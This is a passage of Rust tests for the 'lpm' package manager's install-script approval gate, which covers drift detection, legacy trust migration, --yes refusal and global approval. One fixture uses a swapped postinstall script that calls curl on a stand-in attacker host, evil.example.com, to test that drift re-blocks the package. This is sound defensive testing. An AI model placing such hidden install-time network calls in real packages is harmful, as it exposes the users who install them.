        let project = tempdir().unwrap();
        let store_root = tempdir().unwrap();
        let store = PackageStore::at(store_root.path().to_path_buf());
        write_default_manifest(project.path());
        fake_store_with_pkg(
            store_root.path(),
            "esbuild",
            "0.25.1",
            &serde_json::json!({"postinstall": "tsc"}),
        );

        let installed: Vec<(String, String, Option<String>)> = vec![(
            "esbuild".to_string(),
            "0.25.1".to_string(),
            Some("sha512-x".to_string()),
        )];

        let _ = capture_blocked_set_after_install(
            project.path(),
            &store,
            &installed,
            &read_policy(project.path()),
        )
        .unwrap();
        run(project.path(), None, true, false, false, true)
            .await
            .unwrap();

        // Sanity: post-approval install is silent
        let cap_post_approve = capture_blocked_set_after_install(
            project.path(),
            &store,
            &installed,
            &read_policy(project.path()),
        )
        .unwrap();
        assert!(cap_post_approve.state.blocked_packages.is_empty());

        // Now mutate the script body in the store (simulates a tarball
        // swap or maintainer-pushed hotfix to the same version)
        fake_store_with_pkg(
            store_root.path(),
            "esbuild",
            "0.25.1",
            &serde_json::json!({"postinstall": "node install.js && curl evil.example.com"}),
        );

        // Re-run install ⇒ esbuild MUST be re-blocked with drift flag
        let cap_drift = capture_blocked_set_after_install(
            project.path(),
            &store,
            &installed,
            &read_policy(project.path()),
        )
        .unwrap();
        assert!(
            cap_drift.should_emit_warning,
            "drift must re-emit the warning"
        );
        assert_eq!(cap_drift.state.blocked_packages.len(), 1);
        assert!(
            cap_drift.state.blocked_packages[0].binding_drift,
            "drifted package must be flagged with binding_drift = true"
        );
    }

    #[tokio::test]
    async fn e2e_install_with_legacy_array_form_does_not_break_install() {
        // Backwards-compat: a project with the pre-existing legacy array
        // form must still install. The strict gate sees LegacyNameOnly
        // for the listed package and treats it as approved (with a
        // deprecation warning at build time, but install is fine).
        let project = tempdir().unwrap();
        let store_root = tempdir().unwrap();
        let store = PackageStore::at(store_root.path().to_path_buf());
        write_manifest(
            &project.path().join("package.json"),
            &serde_json::json!({
                "name": "test",
                "version": "0.0.0",
                "lpm": {
                    "trustedDependencies": ["esbuild"],
                },
            }),
        );
        fake_store_with_pkg(
            store_root.path(),
            "esbuild",
            "0.25.1",
            &serde_json::json!({"postinstall": "tsc"}),
        );

        let cap = capture_blocked_set_after_install(
            project.path(),
            &store,
            &[(
                "esbuild".to_string(),
                "0.25.1".to_string(),
                Some("sha512-x".to_string()),
            )],
            &read_policy(project.path()),
        )
        .unwrap();

        // Legacy bare-name approval is enough to NOT block — install
        // proceeds silently. The deprecation warning is emitted at
        // `lpm rebuild` time, not here.
        assert!(cap.state.blocked_packages.is_empty());
        assert!(!cap.should_emit_warning);
    }

    #[tokio::test]
    async fn e2e_install_with_legacy_then_approve_yes_upgrades_to_rich() {
        ensure_security_test_backend();
        // Migration path: project starts with the legacy array form, a
        // NEW package gets installed that needs approval, --yes upgrades
        // the manifest to the rich form AND preserves the existing legacy
        // entries.
        let project = tempdir().unwrap();
        let store_root = tempdir().unwrap();
        let store = PackageStore::at(store_root.path().to_path_buf());
        write_manifest(
            &project.path().join("package.json"),
            &serde_json::json!({
                "name": "test",
                "version": "0.0.0",
                "lpm": {
                    "trustedDependencies": ["sharp"],
                },
            }),
        );
        // sharp is approved (legacy), esbuild is NOT
        fake_store_with_pkg(
            store_root.path(),
            "sharp",
            "0.33.0",
            &serde_json::json!({"install": "node-gyp rebuild"}),
        );
        fake_store_with_pkg(
            store_root.path(),
            "esbuild",
            "0.25.1",
            &serde_json::json!({"postinstall": "tsc"}),
        );

        let installed: Vec<(String, String, Option<String>)> = vec![
            ("sharp".to_string(), "0.33.0".to_string(), None),
            ("esbuild".to_string(), "0.25.1".to_string(), None),
        ];
        let cap = capture_blocked_set_after_install(
            project.path(),
            &store,
            &installed,
            &read_policy(project.path()),
        )
        .unwrap();
        // Only esbuild is blocked (sharp is legacy-approved)
        assert_eq!(cap.state.blocked_packages.len(), 1);
        assert_eq!(cap.state.blocked_packages[0].name, "esbuild");

        // Bulk approve
        run(project.path(), None, true, false, false, true)
            .await
            .unwrap();

        // Manifest is now Rich form with BOTH entries
        let manifest = read_manifest(&project.path().join("package.json"));
        let td = &manifest["lpm"]["trustedDependencies"];
        assert!(td.is_object(), "must be Rich form after first approval");
        let map = td.as_object().unwrap();
        assert!(map.contains_key("esbuild@0.25.1"), "new approval");
        assert!(
            map.contains_key("sharp@*"),
            "legacy entry preserved as `<name>@*`"
        );

        // Lenient lookup still finds sharp via the @* sentinel — install
        // continues to honor it for the legacy use case.
        let policy_after = read_policy(project.path());
        assert!(policy_after.can_run_scripts("sharp"));
    }

    // ── — --yes refusal e2e via run() ──────────

    #[tokio::test]
    async fn e2e_yes_refuses_when_any_entry_is_amber_and_manifest_stays_unchanged() {
        // End-to-end confirmation that the refusal gate wires through
        // to the `run()` entry point the CLI dispatches to. Amber
        // package (playwright install — a D18 downloader) MUST NOT
        // be approved by --yes.
        let project = tempdir().unwrap();
        let store_root = tempdir().unwrap();
        let store = PackageStore::at(store_root.path().to_path_buf());
        write_default_manifest(project.path());
        fake_store_with_pkg(
            store_root.path(),
            "playwright",
            "1.48.0",
            &serde_json::json!({ "postinstall": "playwright install" }),
        );

        let installed: Vec<(String, String, Option<String>)> = vec![(
            "playwright".to_string(),
            "1.48.0".to_string(),
            Some("sha512-x".to_string()),
        )];
        let cap = capture_blocked_set_after_install(
            project.path(),
            &store,
            &installed,
            &read_policy(project.path()),
        )
        .unwrap();
        assert_eq!(cap.state.blocked_packages.len(), 1);
        assert_eq!(
            cap.state.blocked_packages[0].static_tier,
            Some(lpm_security::triage::StaticTier::Amber),
            "D18 `playwright install` must persist as Amber"
        );

        // Snapshot manifest before --yes so we can prove non-mutation.
        let manifest_before = read_manifest(&project.path().join("package.json"));

        // --yes must refuse.
        let err = run(project.path(), None, true, false, false, true)
            .await
            .expect_err("--yes against an amber blocked entry must error");
        let msg = err.to_string();
        assert!(msg.contains("--yes refuses"), "got: {msg}");
        assert!(msg.contains("playwright@1.48.0"), "got: {msg}");

        // Manifest MUST be byte-identical to before — the gate sits
        // before any write_back, so a refusal can't leak a partial
        // approval.
        let manifest_after = read_manifest(&project.path().join("package.json"));
        assert_eq!(
            manifest_before, manifest_after,
            "manifest must be unchanged after a --yes refusal"
        );
        // Specifically: trustedDependencies must not exist / be
        // empty. Either form is acceptable — some projects don't
        // have the key at all.
        assert!(
            manifest_after["lpm"]["trustedDependencies"]
                .as_object()
                .is_none()
                || manifest_after["lpm"]["trustedDependencies"]
                    .as_object()
                    .unwrap()
                    .is_empty(),
            "no trustedDependencies entry must be written on refusal"
        );
    }

    #[tokio::test]
    async fn e2e_yes_approves_all_green_and_does_not_refuse() {
        // Inverse contract: an all-green blocked set passes the
        // gate and --yes approves as before.
        let project = tempdir().unwrap();
        let store_root = tempdir().unwrap();
        let store = PackageStore::at(store_root.path().to_path_buf());
        write_default_manifest(project.path());
        fake_store_with_pkg(
            store_root.path(),
            "typescript",
            "5.0.0",
            &serde_json::json!({ "postinstall": "tsc" }),
        );

        let installed: Vec<(String, String, Option<String>)> = vec![(
            "typescript".to_string(),
            "5.0.0".to_string(),
            Some("sha512-t".to_string()),
        )];
        let cap = capture_blocked_set_after_install(
            project.path(),
            &store,
            &installed,
            &read_policy(project.path()),
        )
        .unwrap();
        assert_eq!(
            cap.state.blocked_packages[0].static_tier,
            Some(lpm_security::triage::StaticTier::Green),
            "tsc body must persist as Green",
        );

        run(project.path(), None, true, false, false, true)
            .await
            .expect("all-green --yes must succeed");

        let manifest = read_manifest(&project.path().join("package.json"));
        assert!(
            manifest["lpm"]["trustedDependencies"]["typescript@5.0.0"].is_object(),
            "green package must be approved after --yes"
        );
    }

    #[tokio::test]
    async fn e2e_yes_passes_through_when_static_tier_is_none_legacy_state() {
        // Pre-P2 upgrade path: if the persisted BuildState predates
        // (static_tier = None on every entry), --yes must still
        // work so upgrading LPM doesn't silently break existing
        // agent/CI flows. The next fresh install will recapture
        // tiers and from then on the gate applies.
        let project = tempdir().unwrap();
        write_default_manifest(project.path());
        // Craft a state file manually with static_tier = None,
        // bypassing the fresh capture path that would populate it.
        write_state(project.path(), vec![make_blocked("legacy-pkg", "1.0.0")]);

        run(project.path(), None, true, false, false, true)
            .await
            .expect("--yes against None-tiered (legacy) state must succeed");

        let manifest = read_manifest(&project.path().join("package.json"));
        assert!(
            manifest["lpm"]["trustedDependencies"]["legacy-pkg@1.0.0"].is_object(),
            "legacy-state entry must be approved on --yes pass-through",
        );
    }

    #[tokio::test]
    async fn e2e_install_with_no_scriptable_packages_no_state_no_warning() {
        // Defensive: a project that installs only packages with no install
        // scripts must not emit any banner.
        let project = tempdir().unwrap();
        let store_root = tempdir().unwrap();
        let store = PackageStore::at(store_root.path().to_path_buf());
        write_default_manifest(project.path());
        fake_store_with_pkg(
            store_root.path(),
            "lodash",
            "4.17.21",
            &serde_json::json!({}),
        );

        let cap = capture_blocked_set_after_install(
            project.path(),
            &store,
            &[("lodash".to_string(), "4.17.21".to_string(), None)],
            &read_policy(project.path()),
        )
        .unwrap();
        assert!(cap.state.blocked_packages.is_empty());
        assert!(!cap.should_emit_warning);
        // State file is still written (so future installs share the same
        // empty fingerprint), but no warning fired.
        assert!(build_state::read_build_state(project.path()).is_some());
    }

    // ── audit Finding 2 — filter persisted state through current trust ──
    //
    // The persisted build-state.json is only refreshed by `lpm install`. If
    // the user approves a package via `lpm approve-scripts` and then runs
    // `--list` or `--yes` again WITHOUT re-installing, the helper must
    // recompute "is this still blocked?" against the CURRENT manifest, not
    // against the stale state file. Pre-fix the state was treated as
    // authoritative and already-approved packages re-appeared in --list.

    // ── Effective blocked set helper ( surgical primitive) ──
    //
    // The pure helper that filters the persisted state through the current
    // trust. Tested directly because reaching it through the `run` function
    // pollutes stdout with TUI / JSON formatting and makes assertions noisy.

    /// **AUDIT REGRESSION ():** filter must REMOVE entries
    /// covered by a Strict match in the current trustedDependencies.
    #[test]
    fn compute_effective_blocked_set_removes_strict_matches() {
        let state = BuildState {
            state_version: BUILD_STATE_VERSION,
            blocked_set_fingerprint: "sha256-test".into(),
            captured_at: "T00:00:00Z".into(),
            blocked_packages: vec![
                make_blocked("esbuild", "0.25.1"),
                make_blocked("sharp", "0.33.0"),
            ],
            drift_ignore_override: None,
        };
        // esbuild approved strictly, sharp not.
        let mut map = std::collections::HashMap::new();
        map.insert(
            "esbuild@0.25.1".to_string(),
            TrustedDependencyBinding {
                integrity: Some("sha512-esbuild-integrity".into()),
                script_hash: Some("sha256-esbuild-hash".into()),
                ..Default::default()
            },
        );
        let trusted = TrustedDependencies::Rich(map);

        let effective = compute_effective_blocked_set(
            &state,
            &trusted,
            &crate::capability::CapabilitySet::default(),
            &crate::capability::UserBound::default(),
        );
        assert_eq!(effective.len(), 1);
        assert_eq!(effective[0].name, "sharp");
    }

    /// **AUDIT REGRESSION ():** filter must REMOVE entries
    /// covered by a LegacyNameOnly match (the legacy bare-name approval is
    /// honored at install time, so it's not "blocked").
    #[test]
    fn compute_effective_blocked_set_removes_legacy_name_only_matches() {
        let state = BuildState {
            state_version: BUILD_STATE_VERSION,
            blocked_set_fingerprint: "sha256-test".into(),
            captured_at: "T00:00:00Z".into(),
            blocked_packages: vec![make_blocked("esbuild", "0.25.1")],
            drift_ignore_override: None,
        };
        let trusted = TrustedDependencies::Legacy(vec!["esbuild".into()]);

        let effective = compute_effective_blocked_set(
            &state,
            &trusted,
            &crate::capability::CapabilitySet::default(),
            &crate::capability::UserBound::default(),
        );
        assert!(
            effective.is_empty(),
            "legacy bare-name approval must be honored as 'not blocked'"
        );
    }

    /// **AUDIT REGRESSION ():** drifted entries must
    /// REMAIN in the effective blocked set even when the manifest has
    /// an entry for the same `name@version`. Drift is the whole reason
    /// we re-review.
    #[test]
    fn compute_effective_blocked_set_keeps_drifted_entries() {
        let mut blocked = make_blocked("esbuild", "0.25.1");
        blocked.script_hash = Some("sha256-NEW".to_string()); // drifted from stored
        let state = BuildState {
            state_version: BUILD_STATE_VERSION,
            blocked_set_fingerprint: "sha256-test".into(),
            captured_at: "T00:00:00Z".into(),
            blocked_packages: vec![blocked],
            drift_ignore_override: None,
        };
        let mut map = std::collections::HashMap::new();
        map.insert(
            "esbuild@0.25.1".to_string(),
            TrustedDependencyBinding {
                integrity: Some("sha512-esbuild-integrity".into()),
                script_hash: Some("sha256-OLD".into()),
                ..Default::default()
            },
        );
        let trusted = TrustedDependencies::Rich(map);

        let effective = compute_effective_blocked_set(
            &state,
            &trusted,
            &crate::capability::CapabilitySet::default(),
            &crate::capability::UserBound::default(),
        );
        assert_eq!(
            effective.len(),
            1,
            "drifted entry must STAY in the effective blocked set"
        );
    }

    /// **AUDIT REGRESSION ():** unrelated entries are
    /// untouched (NotTrusted entries always stay blocked).
    #[test]
    fn compute_effective_blocked_set_keeps_not_trusted_entries() {
        let state = BuildState {
            state_version: BUILD_STATE_VERSION,
            blocked_set_fingerprint: "sha256-test".into(),
            captured_at: "T00:00:00Z".into(),
            blocked_packages: vec![make_blocked("esbuild", "0.25.1")],
            drift_ignore_override: None,
        };
        let trusted = TrustedDependencies::default();
        let effective = compute_effective_blocked_set(
            &state,
            &trusted,
            &crate::capability::CapabilitySet::default(),
            &crate::capability::UserBound::default(),
        );
        assert_eq!(effective.len(), 1);
    }

    /// **AUDIT REGRESSION ( +  interaction):**
    /// After `upgrade_to_rich` writes a `<name>@*` migration sentinel
    /// for a previously-legacy approval, the package MUST remain in
    /// the effective blocked set until the user concretely approves
    /// the specific version via `lpm approve-scripts`. Honoring the
    /// sentinel here would auto-trust every future version under the
    /// inherited name-only approval (cross-version trust laundering).
    #[test]
    fn compute_effective_blocked_set_keeps_package_blocked_under_at_star_sentinel() {
        let state = BuildState {
            state_version: BUILD_STATE_VERSION,
            blocked_set_fingerprint: "sha256-test".into(),
            captured_at: "T00:00:00Z".into(),
            blocked_packages: vec![make_blocked("esbuild", "0.25.1")],
            drift_ignore_override: None,
        };
        // Simulate post-upgrade state: legacy esbuild → esbuild@* sentinel
        let mut td = TrustedDependencies::Legacy(vec!["esbuild".into()]);
        td.upgrade_to_rich();

        let effective = compute_effective_blocked_set(
            &state,
            &td,
            &crate::capability::CapabilitySet::default(),
            &crate::capability::UserBound::default(),
        );
        assert_eq!(
            effective.len(),
            1,
            "esbuild@* sentinel must NOT clear esbuild@0.25.1 from the \
             blocked set — the user must explicitly approve the concrete \
             version via `lpm approve-scripts`, which writes a strict \
             `esbuild@0.25.1` binding"
        );
        assert_eq!(effective[0].name, "esbuild");
    }

    /// **AUDIT REGRESSION ():** `--list` must NOT include
    /// any package that the current `package.json::lpm.trustedDependencies`
    /// already covers strictly.
    #[tokio::test]
    async fn approve_scripts_list_filters_already_approved_packages_from_current_trust() {
        let dir = tempdir().unwrap();
        // The state file says esbuild is blocked
        write_state(dir.path(), vec![make_blocked("esbuild", "0.25.1")]);
        // But the manifest already has a strict approval that matches the
        // exact integrity + script_hash from the state file.
        write_manifest(
            &dir.path().join("package.json"),
            &serde_json::json!({
                "name": "test",
                "version": "0.0.0",
                "lpm": {
                    "trustedDependencies": {
                        "esbuild@0.25.1": {
                            "integrity": "sha512-esbuild-integrity",
                            "scriptHash": "sha256-esbuild-hash"
                        }
                    }
                }
            }),
        );

        // --list mode should print "nothing to approve" because esbuild
        // is already strict-approved. Pre-fix this would have shown
        // esbuild as blocked.
        run(dir.path(), None, false, true, false, true)
            .await
            .unwrap();

        // Sanity: the state file is unchanged (--list is read-only)
        let state = build_state::read_build_state(dir.path()).unwrap();
        assert_eq!(state.blocked_packages.len(), 1);
        // The fix is in the rendering, not in the state file.
    }

    /// **AUDIT REGRESSION ():** `--yes` must skip already-approved
    /// packages and not re-write them.
    #[tokio::test]
    async fn approve_scripts_yes_skips_packages_already_strict_approved_in_manifest() {
        let dir = tempdir().unwrap();
        write_state(
            dir.path(),
            vec![
                make_blocked("esbuild", "0.25.1"),
                make_blocked("sharp", "0.33.0"),
            ],
        );
        // esbuild is already strict-approved; sharp is not.
        write_manifest(
            &dir.path().join("package.json"),
            &serde_json::json!({
                "name": "test",
                "version": "0.0.0",
                "lpm": {
                    "trustedDependencies": {
                        "esbuild@0.25.1": {
                            "integrity": "sha512-esbuild-integrity",
                            "scriptHash": "sha256-esbuild-hash"
                        }
                    }
                }
            }),
        );

        // --yes should approve ONLY sharp (esbuild is already strict-trusted)
        run(dir.path(), None, true, false, false, true)
            .await
            .unwrap();

        let after = read_manifest(&dir.path().join("package.json"));
        let map = after["lpm"]["trustedDependencies"]
            .as_object()
            .expect("Rich form");
        assert!(map.contains_key("esbuild@0.25.1"), "esbuild preserved");
        assert!(map.contains_key("sharp@0.33.0"), "sharp newly approved");
        // The esbuild binding must NOT have been re-written from the
        // state file (which would be a no-op overwrite, but we want the
        // helper to skip already-approved entries entirely).
        assert_eq!(
            map["esbuild@0.25.1"]["integrity"], "sha512-esbuild-integrity",
            "esbuild binding preserved unchanged"
        );
    }

    /// **AUDIT REGRESSION ():** `<pkg>` must reject a package
    /// argument that points at an already-approved entry, with a clear
    /// "already approved" message rather than a useless re-approval.
    #[tokio::test]
    async fn approve_scripts_specific_pkg_for_already_approved_is_a_no_op_with_message() {
        let dir = tempdir().unwrap();
        write_state(dir.path(), vec![make_blocked("esbuild", "0.25.1")]);
        write_manifest(
            &dir.path().join("package.json"),
            &serde_json::json!({
                "name": "test",
                "version": "0.0.0",
                "lpm": {
                    "trustedDependencies": {
                        "esbuild@0.25.1": {
                            "integrity": "sha512-esbuild-integrity",
                            "scriptHash": "sha256-esbuild-hash"
                        }
                    }
                }
            }),
        );

        // Asking to approve esbuild specifically should error with
        // "already approved", NOT silently re-write the entry.
        let err = run(dir.path(), Some("esbuild"), false, false, false, true)
            .await
            .unwrap_err();
        let msg = err.to_string();
        assert!(
            msg.contains("already approved"),
            "expected an 'already approved' message, got: {msg}"
        );
    }

    /// **AUDIT REGRESSION ():** if EVERY package in the
    /// persisted state is already approved, `--list` should report nothing
    /// to approve (empty effective blocked set), not the stale entries.
    #[tokio::test]
    async fn approve_scripts_list_reports_nothing_when_all_persisted_blocked_are_already_approved()
    {
        let dir = tempdir().unwrap();
        write_state(
            dir.path(),
            vec![
                make_blocked("esbuild", "0.25.1"),
                make_blocked("sharp", "0.33.0"),
            ],
        );
        write_manifest(
            &dir.path().join("package.json"),
            &serde_json::json!({
                "name": "test",
                "version": "0.0.0",
                "lpm": {
                    "trustedDependencies": {
                        "esbuild@0.25.1": {
                            "integrity": "sha512-esbuild-integrity",
                            "scriptHash": "sha256-esbuild-hash"
                        },
                        "sharp@0.33.0": {
                            "integrity": "sha512-sharp-integrity",
                            "scriptHash": "sha256-sharp-hash"
                        }
                    }
                }
            }),
        );

        run(dir.path(), None, false, true, false, true)
            .await
            .unwrap();

        // The package.json must be byte-identical (no rewrite happened)
        let after = read_manifest(&dir.path().join("package.json"));
        assert_eq!(
            after["lpm"]["trustedDependencies"]
                .as_object()
                .unwrap()
                .len(),
            2
        );
    }

    /// **AUDIT REGRESSION ():** drift overrides "already approved".
    /// If the persisted state shows a script_hash that drifts from the
    /// stored binding, the package MUST appear in the effective blocked
    /// set (this is the whole point of script-hash binding).
    #[tokio::test]
    async fn approve_scripts_yes_does_not_skip_packages_with_binding_drift() {
        let dir = tempdir().unwrap();
        // State file claims script_hash = sha256-NEW
        let mut blocked = make_blocked("esbuild", "0.25.1");
        blocked.script_hash = Some("sha256-NEW".to_string());
        blocked.binding_drift = true;
        write_state(dir.path(), vec![blocked]);

        // Manifest has the OLD binding
        write_manifest(
            &dir.path().join("package.json"),
            &serde_json::json!({
                "name": "test",
                "version": "0.0.0",
                "lpm": {
                    "trustedDependencies": {
                        "esbuild@0.25.1": {
                            "integrity": "sha512-esbuild-integrity",
                            "scriptHash": "sha256-OLD"
                        }
                    }
                }
            }),
        );

        // --yes should re-approve esbuild with the NEW script_hash from
        // the state file because the binding drifted.
        run(dir.path(), None, true, false, false, true)
            .await
            .unwrap();

        let after = read_manifest(&dir.path().join("package.json"));
        let binding = &after["lpm"]["trustedDependencies"]["esbuild@0.25.1"];
        assert_eq!(
            binding["scriptHash"], "sha256-NEW",
            "drift must trigger re-approval with the new script hash"
        );
    }

    // ── audit Finding 3 — --json mode emits exactly one JSON payload ──
    //
    // The bug: emit_yes_warning_banner unconditionally calls tracing::warn!,
    // and the tracing subscriber in main.rs writes to stdout (no
    // .with_writer(stderr) configured). So a `--yes --json` invocation
    // produces a WARN line on stdout BEFORE the JSON object, breaking any
    // downstream JSON.parse.
    //
    // We can't easily intercept tracing output from a unit test (the
    // global subscriber is set once per process), so the unit-level
    // regression here just verifies the BEHAVIOR contract: in JSON mode,
    // emit_yes_warning_banner must NOT call tracing::warn! / println!.
    // The CLI-level test (driving the binary as a subprocess) is the
    // end-to-end gate — see lpm-cli/tests/approve_scripts_cli.rs.

    #[tokio::test]
    async fn approve_scripts_yes_json_emits_warning_only_in_json_warnings_field() {
        let dir = tempdir().unwrap();
        write_default_manifest(dir.path());
        write_state(dir.path(), vec![make_blocked("esbuild", "0.25.1")]);

        // --yes --json — verify the manifest mutation lands AND the
        // structured warning is in the JSON warnings array. The full
        // stdout-purity test is at the CLI level (subprocess capture).
        run(dir.path(), None, true, false, false, true)
            .await
            .unwrap();

        let after = read_manifest(&dir.path().join("package.json"));
        assert!(after["lpm"]["trustedDependencies"]["esbuild@0.25.1"].is_object());
        // The function should have completed without panicking. The
        // CLI-level subprocess test verifies the stdout layer.
    }

    // ─── approve-scripts --global ───────────────────────────────

    use crate::build_state::compute_blocked_set_fingerprint;
    use crate::global_blocked_set::{AggregateBlockedRow, AggregateBlockedSet};
    use chrono::Utc;
    use lpm_global::{GlobalManifest, PackageEntry, PackageSource};

    fn scoped_lpm_home(path: &Path) -> crate::test_env::ScopedEnv {
        crate::test_env::ScopedEnv::set([("LPM_HOME", path.as_os_str().to_owned())])
    }

    fn row(name: &str, version: &str, origins: &[&str]) -> AggregateBlockedRow {
        AggregateBlockedRow {
            name: name.into(),
            version: version.into(),
            integrity: Some(format!("sha512-{name}{version}")),
            script_hash: Some(format!("sha256-{name}{version}")),
            phases_present: vec!["postinstall".into()],
            binding_drift: false,
            // Default to None tier — legacy / pre-classification state.
            // Tests that exercise the global tier gate construct rows
            // with an explicit tier via [`row_tiered`] below.
            static_tier: None,
            origins: origins.iter().map(|s| (*s).to_string()).collect(),
        }
    }

    fn deny_verify_policy() -> VerifyPolicy {
        VerifyPolicy {
            enforce: EnforceMode::Deny,
            skip: SkipPolicy::None,
        }
    }

    fn seed_global_manifest_with_blocked(
        root: &lpm_common::LpmRoot,
        top_level: &str,
        top_level_version: &str,
        blocked_rows: Vec<AggregateBlockedRow>,
    ) {
        ensure_security_test_backend();
        let rel_root = format!("installs/{}@{}", top_level, top_level_version);
        let install_root = root.global_root().join(&rel_root);
        std::fs::create_dir_all(&install_root).unwrap();

        let blocked_packages: Vec<crate::build_state::BlockedPackage> = blocked_rows
            .into_iter()
            .map(|row| crate::build_state::BlockedPackage {
                name: row.name,
                version: row.version,
                integrity: row.integrity,
                script_hash: row.script_hash,
                phases_present: row.phases_present,
                binding_drift: row.binding_drift,
                // fields default to None when constructing
                // from the `ApproveRow` test helper. The row type
                // doesn't carry tier/provenance/etc. yet; when later
                // phases need them, extend `ApproveRow` in lockstep.
                static_tier: None,
                provenance_at_capture: None,
                published_at: None,
                behavioral_tags_hash: None,
                behavioral_tags: None,
            })
            .collect();

        let state = BuildState {
            state_version: BUILD_STATE_VERSION,
            blocked_set_fingerprint: compute_blocked_set_fingerprint(&blocked_packages),
            captured_at: Utc::now().to_rfc3339(),
            blocked_packages,
            drift_ignore_override: None,
        };
        crate::build_state::write_build_state(&install_root, &state).unwrap();

        let mut manifest = GlobalManifest::default();
        manifest.packages.insert(
            top_level.into(),
            PackageEntry {
                saved_spec: "^1".into(),
                resolved: top_level_version.into(),
                integrity: "sha512-top-level".into(),
                source: PackageSource::UpstreamNpm,
                installed_at: Utc::now(),
                root: rel_root,
                commands: vec![],
            },
        );
        lpm_global::write_for(root, &manifest).unwrap();
    }

    #[test]
    fn lookup_aggregate_by_arg_matches_bare_name_when_unique() {
        let rows = vec![row("esbuild", "0.25.1", &["eslint"])];
        let hit = match lookup_aggregate_by_arg(&rows, "esbuild") {
            AggregateLookup::Match(r) => r,
            other => panic!("expected Match, got {other:?}"),
        };
        assert_eq!(hit.name, "esbuild");
    }

    #[test]
    fn lookup_aggregate_by_arg_matches_name_at_version() {
        let rows = vec![
            row("esbuild", "0.25.1", &["eslint"]),
            row("esbuild", "0.25.2", &["typescript"]),
        ];
        let hit = match lookup_aggregate_by_arg(&rows, "esbuild@0.25.2") {
            AggregateLookup::Match(r) => r,
            other => panic!("expected Match, got {other:?}"),
        };
        assert_eq!(hit.version, "0.25.2");
    }

    #[test]
    fn lookup_aggregate_by_arg_returns_notfound_for_unknown_name() {
        let rows = vec![row("esbuild", "0.25.1", &["eslint"])];
        assert!(matches!(
            lookup_aggregate_by_arg(&rows, "ghost"),
            AggregateLookup::NotFound
        ));
    }

    /// Audit: finding 1 (Medium): bare-name lookup against a rows set
    /// where two versions exist for the same name MUST return Ambiguous,
    /// not silently take the first. Pre-fix `find_aggregate_by_arg` did
    /// the latter — a latent data-corruption bug where
    /// `lpm approve-scripts --global esbuild` would approve the wrong
    /// version binding without any feedback.
    #[test]
    fn lookup_aggregate_by_arg_is_ambiguous_when_bare_name_matches_multiple_versions() {
        let rows = vec![
            row("esbuild", "0.25.1", &["eslint"]),
            row("esbuild", "0.25.2", &["typescript"]),
        ];
        match lookup_aggregate_by_arg(&rows, "esbuild") {
            AggregateLookup::Ambiguous { candidates } => {
                assert_eq!(candidates.len(), 2);
            }
            other => panic!(
                "expected Ambiguous — bare `esbuild` matches two versions, \
                 got {other:?}"
            ),
        }
    }

    /// name@version CAN be ambiguous too: two install roots that contain
    /// the same `name@version` but with different (integrity, script_hash)
    /// bindings (e.g., tarball swap between installs) produce two
    /// aggregate rows per the dedup rule. User MUST disambiguate; silent
    /// first-match would approve the wrong binding.
    #[test]
    fn lookup_aggregate_by_arg_is_ambiguous_when_name_at_version_matches_multiple_bindings() {
        let mut a = row("esbuild", "0.25.1", &["eslint"]);
        a.integrity = Some("sha512-A".into());
        let mut b = row("esbuild", "0.25.1", &["typescript"]);
        b.integrity = Some("sha512-B".into());
        let rows = vec![a, b];
        match lookup_aggregate_by_arg(&rows, "esbuild@0.25.1") {
            AggregateLookup::Ambiguous { candidates } => {
                assert_eq!(candidates.len(), 2);
            }
            other => panic!("expected Ambiguous across distinct bindings: {other:?}"),
        }
    }

    #[test]
    fn group_remaining_rows_by_origin_omits_rows_already_decided_everywhere() {
        let shared = row("esbuild", "0.25.1", &["eslint", "typescript"]);
        let unique = row("sharp", "0.33.0", &["typescript"]);
        let agg = AggregateBlockedSet {
            rows: vec![shared.clone(), unique],
            unreadable_origins: vec![],
        };
        let mut decided = std::collections::HashSet::new();
        decided.insert(AggregateRowKey::from_row(&shared));

        let grouped = group_remaining_rows_by_origin(&agg, &decided);
        assert!(!grouped.contains_key("eslint"));
        let ts_rows = grouped
            .get("typescript")
            .expect("typescript should still have remaining rows");
        assert_eq!(ts_rows.len(), 1);
        assert_eq!(ts_rows[0].name, "sharp");
    }

    /// End-to-end: `run_global_named` surfaces the ambiguity as a
    /// Script error whose message names all candidates so the user
    /// can re-run with a disambiguating `name@version`.
    #[tokio::test]
    async fn run_global_named_surfaces_bare_name_ambiguity_with_candidates() {
        let tmp = tempdir().unwrap();
        let root = lpm_common::LpmRoot::from_dir(tmp.path());
        let agg = AggregateBlockedSet {
            rows: vec![
                row("esbuild", "0.25.1", &["eslint"]),
                row("esbuild", "0.25.2", &["typescript"]),
            ],
            unreadable_origins: vec![],
        };
        let policy = deny_verify_policy();
        let err = run_global_named(
            &root,
            &agg,
            "esbuild",
            false,
            true,
            &policy,
            EnforceMode::Deny,
        )
        .await
        .unwrap_err();
        let msg = err.to_string();
        assert!(msg.contains("ambiguous"), "error must say ambiguous: {msg}");
        assert!(
            msg.contains("esbuild@0.25.1") && msg.contains("esbuild@0.25.2"),
            "error must list both candidates so the user can disambiguate: {msg}"
        );
        // Trust file must NOT have been written on ambiguity — no
        // row was approved.
        let trust = lpm_global::trusted_deps::read_for(&root).unwrap();
        assert!(trust.trusted.is_empty(), "no writes on ambiguity");
    }

    /// --list (read-only) with the default group setting renders every
    /// row once with its origin list. Flat shape; each row shows
    /// `name @ version — used by A, B`.
    #[test]
    fn print_global_list_handles_empty_aggregate_without_panicking() {
        let agg = AggregateBlockedSet::default();
        // (group, dry_run, json_output) — exercise the four
        // `(group × json)` shapes twice: once with dry_run=false,
        // once with dry_run=true. Smoke test that neither signal
        // panics the empty-aggregate branch.
        print_global_list(&agg, false, false, false);
        print_global_list(&agg, true, false, false);
        print_global_list(&agg, false, false, true);
        print_global_list(&agg, false, true, true);
    }

    /// `--yes` writes every aggregate row into the global trust file
    /// AND surfaces a `warnings` entry in JSON mode so agents can
    /// detect bulk-approval flows.
    #[tokio::test]
    async fn run_global_bulk_yes_writes_each_row_to_trust_file() {
        ensure_security_test_backend();
        let tmp = tempdir().unwrap();
        let root = lpm_common::LpmRoot::from_dir(tmp.path());
        let agg = AggregateBlockedSet {
            rows: vec![
                row("esbuild", "0.25.1", &["eslint"]),
                row("sharp", "0.33.0", &["typescript"]),
            ],
            unreadable_origins: vec![],
        };
        // JSON mode so no interactive prompts and output goes to stdout.
        let policy = deny_verify_policy();
        run_global_bulk_yes(&root, &agg, false, true, &policy, EnforceMode::Deny)
            .await
            .unwrap();
        let trust = lpm_global::trusted_deps::read_for(&root).unwrap();
        assert!(trust.trusted.contains_key("esbuild@0.25.1"));
